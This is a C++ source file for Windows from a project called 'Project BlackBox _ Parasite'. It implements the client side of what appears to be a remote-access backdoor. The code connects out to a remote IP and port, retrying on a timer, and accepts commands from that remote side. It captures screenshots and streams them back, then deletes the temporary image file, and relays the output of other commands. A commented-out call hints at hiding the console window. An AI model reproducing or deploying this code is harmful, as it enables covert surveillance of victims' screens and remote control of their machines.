// Project BlackBox _ Parasite (c) Andrew Woo, 2019
// Email: seungminleader@gmail.com

/* Version: bA004
 * Role: Client (establish connection)
 * Role in Symbiotic Relationship: Host << recieve instructions
 * System: Windows
 */

#define WIN32_LEAN_AND_MEAN

#include "misc.h"

#include "host-client/cmdcenter.h"

#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <algorithm>

#include <cstdlib>
#include <cstdio>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 10238976
#define DEFAULT_PORT "27015"

int MAX_ATTEMPTS = 10;

// int __cdecl main(int argc, char **argv) {
int __cdecl host(int argc, char **argv) {

	system("TITLE Host");

	/*if (FreeConsole() == 0) {
		return -1;
	}*/

	std::string ipaddr = argv[2];
	char* port = argv[3];

	std::cout << "\nAttempting to connect to: " << ipaddr << ":" << port << "\n" << std::endl;

	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL, *ptr = NULL, hints;
	char recvbuf[DEFAULT_BUFLEN] = {};

	int iResult;
	int iSendResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Validate the parameters
	//if (argc != 2) {
	//	printf("Usage: host IPv4_Address\n");
	//	return 1;
	//}

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup() failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ipaddr.c_str(), port, &hints, &result);
	if (iResult != 0) {

		printf("getaddrinfo() failed with error: %d\n", iResult);
		WSACleanup();

		return 1;
	}

	// *** ESTABLISH CONNECTION ******************************************************************************************** //
	bool infrun = false;

	if (!infrun) {

		for (int x = 0; x < MAX_ATTEMPTS; x++) {

			// Attempt to connect to an address until one succeeds
			for (ptr = result; ptr != NULL;ptr = ptr->ai_next) {

				// Create a SOCKET for connecting to server
				ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

				if (ConnectSocket == INVALID_SOCKET) {

					printf("Socket failed with error: %ld\n", WSAGetLastError());
					WSACleanup();

					return 1;
				}

				// Connect to server.
				iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
				if (iResult == SOCKET_ERROR) {

					closesocket(ConnectSocket);
					ConnectSocket = INVALID_SOCKET;

					continue;
				}
				break;
			}

			if (ConnectSocket == INVALID_SOCKET) {

				if (x == MAX_ATTEMPTS - 1) {

					freeaddrinfo(result);

					printf("Connection attempt [%d] failed. Trying again...\n", x + 1);
					printf("Maximum connection attempts exhausted.\n\n");

					WSACleanup();

					return 1;
				}
				else {
					printf("Connection attempt [%d] failed. Trying again...\n", x + 1);
				}
			}
			else {
				freeaddrinfo(result);
				printf("Connected!\n\n");
				break;
			}
		}
	}
	else {

		while (infrun) {

			for (int x = 0; x < MAX_ATTEMPTS; x++) {

				// Attempt to connect to an address until one succeeds
				for (ptr = result; ptr != NULL;ptr = ptr->ai_next) {

					// Create a SOCKET for connecting to server
					ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

					if (ConnectSocket == INVALID_SOCKET) {

						printf("Socket failed with error: %ld\n", WSAGetLastError());
						WSACleanup();

						return 1;
					}

					// Connect to server.
					iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
					if (iResult == SOCKET_ERROR) {

						closesocket(ConnectSocket);
						ConnectSocket = INVALID_SOCKET;

						continue;
					}
					break;
				}

				if (ConnectSocket == INVALID_SOCKET) {

					if (x == MAX_ATTEMPTS - 1) {

						printf("Connection attempt [%d] failed. Trying again...\n", x + 1);
						printf("Maximum connection attempts exhausted. Trying again in 90 seconds.\n\n");

						Sleep(90000);
					}
					else {
						printf("Connection attempt [%d] failed. Trying again...\n", x + 1);
					}
				}
				else {
					freeaddrinfo(result);
					infrun = false;
					printf("Connected!\n\n");

					break;
				}
			}
		}
	}
	// *** ESTABLISH CONNECTION ******************************************************************************************** //

	// *** RECV DATA ******************************************************************************************************* //
	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

		if (iResult > 0) {

			printf("Bytes received: %d\n", iResult);

			std::string srecvbuf = recvbuf;

			std::vector<std::string> input;
			std::string buf;

			// SORT COMMAND //
			std::stringstream ss(srecvbuf);
			while (ss >> buf) {
				input.push_back(buf);
			}

			if (input[0] == "screenshot") {

				std::string savepath = "__9LzQkuo7bq.jpg";
				ULONG quality = 100;

				for (int z = 0; z < stoi(input[1]); z++) {

					SaveScreenshot(savepath, quality);

					FILE *sendfile = fopen(savepath.c_str(), "rb");
					int imgsendlen = 0;

					while (true) {

						unsigned char buf[1024];
						int nread = fread(buf, 1, 1024, sendfile);

						if (nread <= 0) {
							iSendResult = send(ConnectSocket, "end", 4, 0);
							break;
						}
						else {

							iSendResult = send(ConnectSocket, reinterpret_cast<char*>(buf), 1024, 0);
							if (iSendResult == SOCKET_ERROR) {
								printf("send failed with error: %d\n", WSAGetLastError());
								break;
							}
							else {
								imgsendlen += iSendResult;
							}
						}
					}

					fclose(sendfile);
					remove(savepath.c_str());
					printf("Bytes sent: %d\n\n", imgsendlen);
				}
			}
			else {

				srecvbuf = cc_input(input);
				ZeroMemory(recvbuf, recvbuflen);

				// RETURN DATA //
				iSendResult = send(ConnectSocket, srecvbuf.c_str(), srecvbuf.size(), 0);
				if (iSendResult == SOCKET_ERROR) {
					printf("send failed with error: %d\n", WSAGetLastError());
				}
				else {
					printf("Bytes sent: %d\n\n", iSendResult);
				}
			}
		}
		else if (iResult == 0) {
			printf("Connection closed\n\n");
		}
		else {

			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);

			WSACleanup();

			return 1;
		}
	} while (iResult > 0);
	// *** RECV DATA ******************************************************************************************************* //

	// *** SHUTDOWN ******************************************************************************************************** //
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {

		printf("Shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);

		WSACleanup();

		return 1;
	}

	closesocket(ConnectSocket);
	WSACleanup();
	// *** SHUTDOWN ******************************************************************************************************** //

	return 0;
}
